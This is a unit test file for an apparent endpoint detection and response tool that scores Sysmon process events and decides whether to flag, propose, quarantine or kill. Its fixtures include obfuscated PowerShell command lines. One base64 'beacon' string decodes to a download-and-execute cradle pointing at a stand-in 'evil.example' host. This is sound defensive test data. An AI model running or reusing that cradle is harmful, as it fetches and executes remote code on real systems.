import unittest

from argus.config import Config
from argus.engine import decide, process_event
from argus.events import ProcessEvent
from argus.score import ScoreResult, score_event


def suspicious_event():
    # A realistic would-be-kill: PowerShell running an encoded command (propose band).
    return ProcessEvent(
        source="sysmon", event_id=1, timestamp="", pid=42, parent_pid=0,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -NoP -enc X",
    )


class TestDecide(unittest.TestCase):
    def test_thresholds(self):
        cfg = Config(flag_threshold=40, kill_threshold=70)
        self.assertEqual(decide(ScoreResult(points=0), cfg), "allow")
        self.assertEqual(decide(ScoreResult(points=40), cfg), "flag")
        self.assertEqual(decide(ScoreResult(points=69), cfg), "flag")
        self.assertEqual(decide(ScoreResult(points=70), cfg), "propose")
        self.assertEqual(decide(ScoreResult(points=84), cfg), "propose")
        self.assertEqual(decide(ScoreResult(points=85), cfg), "quarantine")


class TestProcessEvent(unittest.TestCase):
    def test_dry_run_takes_no_action(self):
        cfg = Config(dry_run=True, flag_threshold=40, kill_threshold=70)
        called = []
        rep = process_event(
            suspicious_event(),
            cfg,
            quarantine_fn=lambda p, q, r="": called.append("q") or "dest",
            kill_fn=lambda pid: called.append("k"),
        )
        self.assertEqual(rep.decision, "propose")   # 70-85 => propose (HITL)
        self.assertEqual(called, [])                # dry-run => no side effects

    def test_act_quarantines_and_kills(self):
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        called = []
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=42, parent_pid=0,
                         image=r"C:\Temp\powershell.exe",
                         command_line="powershell.exe -enc X -nop -w hidden"),   # reloc'd LOLBin in temp => auto-quarantine
            cfg,
            quarantine_fn=lambda p, q, r="": called.append("q") or "dest",
            kill_fn=lambda pid: called.append("k"),
        )
        self.assertEqual(rep.decision, "quarantine")
        self.assertIn("q", called)
        self.assertIn("k", called)

    def test_hard_evidence_kills_immediately_without_llm(self):
        # score >= HARD_EVIDENCE must kill now and never block on the local model.
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        calls = {"adjudicate": 0, "kill": 0}

        def adjudicate_fn(e, s, h=None):
            calls["adjudicate"] += 1
            return {"verdict": "BENIGN", "reason": "model says no"}

        ev = ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=42, parent_pid=0,
                          image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                          command_line="powershell.exe -enc X -nop -w hidden -exec bypass")
        rep = process_event(ev, cfg, adjudicate_fn=adjudicate_fn,
                            kill_fn=lambda pid: calls.__setitem__("kill", calls["kill"] + 1))
        self.assertEqual(rep.decision, "quarantine")
        self.assertEqual(calls["adjudicate"], 0)   # LLM never consulted
        self.assertEqual(calls["kill"], 1)         # killed immediately
        self.assertTrue(rep.adjudication.get("skipped_llm"))

    def test_borderline_kill_still_asks_llm_and_downgrades(self):
        # score in [kill_threshold, HARD_EVIDENCE) still consults the model; a BENIGN
        # verdict downgrades to flag (fail-safe).
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        calls = {"adjudicate": 0}

        def adjudicate_fn(e, s, h=None):
            calls["adjudicate"] += 1
            return {"verdict": "BENIGN", "reason": "model says no"}

        rep = process_event(suspicious_event(), cfg, adjudicate_fn=adjudicate_fn)  # score 80
        self.assertEqual(rep.decision, "flag")      # downgraded
        self.assertEqual(calls["adjudicate"], 1)    # model WAS consulted

    def test_act_kills_but_never_quarantines_trusted_binary(self):
        # A System32 LOLBin that scores >= kill_threshold must be killed, but its
        # executable must NOT be moved — quarantining python.exe/powershell.exe is a
        # self-inflicted wound, not a remediation. Regression guard.
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        called = []
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=42, parent_pid=0,
                         image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         command_line="powershell.exe -nop -w hidden -enc X"),
            cfg,
            quarantine_fn=lambda p, q, r="": called.append("q") or "dest",
            kill_fn=lambda pid: called.append("k"),
        )
        self.assertEqual(rep.decision, "quarantine")
        self.assertNotIn("q", called)                # never moved
        self.assertIn("k", called)                   # still killed
        self.assertTrue(any("skipped" in a for a in rep.actions))

    def test_flag_takes_no_action_even_when_acting(self):
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        called = []
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=1, parent_pid=0,
                         image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         command_line="powershell.exe -nop -w hidden"),
            cfg,
            quarantine_fn=lambda p, q, r="": called.append("q"),
            kill_fn=lambda pid: called.append("k"),
        )
        self.assertEqual(rep.decision, "flag")
        self.assertEqual(called, [])

    def test_verdict_looked_up_when_sha_and_fn_present(self):
        cfg = Config(dry_run=True)
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=1, parent_pid=0,
                         image=r"C:\x.exe", hashes="SHA256=" + "A" * 64),
            cfg,
            verdict_fn=lambda h: "5/70 malicious",
        )
        self.assertEqual(rep.vt, "5/70 malicious")

    def test_no_verdict_without_sha(self):
        cfg = Config(dry_run=True)
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=1, parent_pid=0, image=r"C:\x.exe"),
            cfg,
            verdict_fn=lambda h: "5/70 malicious",
        )
        self.assertEqual(rep.vt, "")

    def test_report_json(self):
        cfg = Config(dry_run=True)
        rep = process_event(suspicious_event(), cfg)
        self.assertIn('"decision"', rep.to_json())

    def test_severity_tiers(self):
        cfg = Config(dry_run=True)
        self.assertEqual(process_event(suspicious_event(), cfg).severity, "high")
        mid = ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=1, parent_pid=0,
                           image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                           command_line="powershell.exe -nop -w hidden")
        self.assertEqual(process_event(mid, cfg).severity, "medium")


    def test_memory_retrieval_injects_history_and_ingests(self):
        import tempfile
        import time
        from pathlib import Path

        from argus.memory import MemoryRecord, MemoryStore
        from argus.signature import BehaviorSignature

        cfg = Config(dry_run=True, flag_threshold=40, kill_threshold=70)
        with tempfile.TemporaryDirectory() as d:
            mem = MemoryStore(Path(d) / "mem.jsonl")
            prior = BehaviorSignature(
                techniques=frozenset({"T1059.001"}),
                structural=frozenset({"image:shell", "path:system", "parent:shell"}),
                image=r"c:\windows\system32\windowspowershell\v1.0\powershell.exe",
                image_base="powershell.exe",
            )
            mem.ingest(MemoryRecord(id="prior", signature=prior, verdict="BENIGN",
                                    outcome="confirmed_false_positive", confidence="high",
                                    ts=time.time(), image=prior.image))

            seen_history = []

            def adjudicate_fn(e, s, h=None):
                seen_history.append(h)
                return {"verdict": "BENIGN", "reason": "matches prior FP"}

            ev = ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=7, parent_pid=2,
                              image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                              command_line="powershell.exe -enc ZA== -nop",
                              parent_image=r"C:\Windows\System32\cmd.exe")
            rep = process_event(ev, cfg, adjudicate_fn=adjudicate_fn, memory=mem)

            self.assertTrue(seen_history and seen_history[0])        # history was injected
            self.assertEqual(seen_history[0][0][0].id, "prior")     # similar record retrieved first
            self.assertTrue(rep.memory_id)                          # stable id carried on the report
            self.assertEqual(mem.stats()["episodic"], 1)            # new incident ingested (episodic)


    def test_confirmed_false_positive_vetoes_containment(self):
        # A high-confidence (analyst-confirmed) BENIGN record for this EXACT
        # signature (payload-aware) must downgrade a would-be containment to a flag,
        # so the dashboard never offers "approve containment" on a cleared behavior.
        import tempfile
        import time
        from pathlib import Path

        from argus.memory import MemoryRecord, MemoryStore
        from argus.signature import BehaviorSignature, signature_id

        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        ev = ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=7, parent_pid=2,
                          image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                          command_line="powershell.exe -NoP -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABlAG4AYwBvAGQAZQBkAC0AZABlAG0AbwA=",
                          parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
        with tempfile.TemporaryDirectory() as d:
            mem = MemoryStore(Path(d) / "mem.jsonl")
            sig = BehaviorSignature.from_event(ev, score_event(ev))
            mem.ingest(MemoryRecord(id=signature_id(sig), signature=sig, verdict="BENIGN",
                                    outcome="confirmed_false_positive", confidence="high",
                                    ts=time.time(), image=ev.image))
            rep = process_event(ev, cfg, memory=mem)
            self.assertEqual(rep.decision, "flag")
            self.assertTrue(any("known-benign" in a for a in rep.actions))
            self.assertEqual(mem.stats()["episodic"], 0)            # known-benign: not re-ingested


    def test_different_payload_not_vetoed(self):
        # The veto is payload-scoped: a DIFFERENT encoded payload must still propose,
        # even when a sibling payload was already confirmed benign.
        import tempfile
        import time
        from pathlib import Path

        from argus.memory import MemoryRecord, MemoryStore
        from argus.signature import BehaviorSignature, signature_id

        cfg = Config(dry_run=True, flag_threshold=40, kill_threshold=70)
        def make_ev(b64):
            return ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=8, parent_pid=2,
                                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                                command_line=f"powershell.exe -NoP -enc {b64}",
                                parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")

        with tempfile.TemporaryDirectory() as d:
            mem = MemoryStore(Path(d) / "mem.jsonl")
            demo = make_ev("VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABlAG4AYwBvAGQAZQBkAC0AZABlAG0AbwA=")
            dsig = BehaviorSignature.from_event(demo, score_event(demo))
            mem.ingest(MemoryRecord(id=signature_id(dsig), signature=dsig, verdict="BENIGN",
                                    outcome="confirmed_false_positive", confidence="high",
                                    ts=time.time(), image=demo.image))

            beacon = make_ev("SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=")
            rep = process_event(beacon, cfg, memory=mem)
            self.assertEqual(rep.decision, "propose")


    def test_graph_flags_and_records_novel_edge(self):
        import tempfile
        from pathlib import Path

        from argus.graph import ProcessGraph

        cfg = Config(dry_run=True, flag_threshold=40, kill_threshold=70)
        with tempfile.TemporaryDirectory() as d:
            g = ProcessGraph(Path(d) / "graph.jsonl")
            ev = ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=9, parent_pid=1,
                              image=r"C:\Windows\System32\cmd.exe",
                              parent_image=r"C:\Windows\explorer.exe")
            rep = process_event(ev, cfg, graph=g)
            self.assertIn("novel parent->child", " ".join(rep.score.reasons))
            self.assertFalse(g.novel(r"C:\Windows\explorer.exe", r"C:\Windows\System32\cmd.exe"))
            # a repeat of the same edge is now part of the learned baseline
            rep2 = process_event(ev, cfg, graph=g)
            self.assertNotIn("novel parent->child", " ".join(rep2.score.reasons))


    def test_propose_takes_no_action_even_when_acting(self):
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        called = []
        rep = process_event(suspicious_event(), cfg,   # score 80 -> propose
                            quarantine_fn=lambda p, q, r="": called.append("q"),
                            kill_fn=lambda pid: called.append("k"))
        self.assertEqual(rep.decision, "propose")
        self.assertEqual(called, [])                     # HITL: no auto action
        self.assertTrue(any("proposed" in a for a in rep.actions))


    def test_memory_dump_before_kill(self):
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        order = []

        def dump_fn(pid, image=""):
            order.append("dump")
            return r"C:\dumps\x.dmp"

        def kill_fn(pid):
            order.append("kill")

        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=42, parent_pid=0,
                         image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         command_line="powershell.exe -enc X -nop -w hidden"),
            cfg, dump_fn=dump_fn, kill_fn=kill_fn,
        )
        self.assertEqual(rep.decision, "quarantine")
        self.assertEqual(order, ["dump", "kill"])            # capture BEFORE terminate
        self.assertTrue(any("dumped" in a for a in rep.actions))

    def test_no_dump_in_dry_run(self):
        cfg = Config(dry_run=True, flag_threshold=40, kill_threshold=70)
        called = []
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=42, parent_pid=0,
                         image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         command_line="powershell.exe -enc X -nop -w hidden"),
            cfg, dump_fn=lambda p, i="": called.append("dump"),
        )
        self.assertEqual(called, [])                        # dry-run: no side effects


    def test_dropped_script_is_quarantined_when_acting(self):
        # A script host running a dropped .py from %TEMP% is only FLAGGED (the
        # interpreter is trusted), but the DROPPED SCRIPT itself must be moved into
        # the vault. This is what fills the quarantine counter for a script-based op.
        cfg = Config(dry_run=False, flag_threshold=40, kill_threshold=70)
        moved = []
        rep = process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=9, parent_pid=1,
                         image=r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe",
                         command_line=r'python.exe "C:\Users\N\AppData\Local\Temp\argus_agent.py"'),
            cfg,
            quarantine_fn=lambda p, q, r="": moved.append(p) or "dest",
        )
        self.assertEqual(rep.decision, "flag")
        self.assertEqual(len(moved), 1)
        self.assertTrue(moved[0].endswith("argus_agent.py"))
        self.assertTrue(any("quarantined dropped script" in a for a in rep.actions))

    def test_dropped_script_not_quarantined_in_dry_run(self):
        cfg = Config(dry_run=True, flag_threshold=40, kill_threshold=70)
        moved = []
        process_event(
            ProcessEvent(source="sysmon", event_id=1, timestamp="", pid=9, parent_pid=1,
                         image=r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe",
                         command_line=r'python.exe "C:\Users\N\AppData\Local\Temp\argus_agent.py"'),
            cfg,
            quarantine_fn=lambda p, q, r="": moved.append(p),
        )
        self.assertEqual(moved, [])


if __name__ == "__main__":
    unittest.main()
